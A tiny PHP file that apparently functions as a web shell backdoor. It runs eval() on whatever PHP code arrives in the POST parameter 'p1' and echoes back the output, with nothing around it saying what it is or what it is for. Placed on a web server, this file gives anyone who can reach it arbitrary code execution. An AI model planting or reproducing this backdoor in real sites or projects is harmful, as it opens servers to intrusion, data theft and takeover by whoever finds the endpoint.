<?php
$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
ob_start();
eval($_POST['p1']);
$temp = ob_get_clean();
echo $temp;
exit; 
?>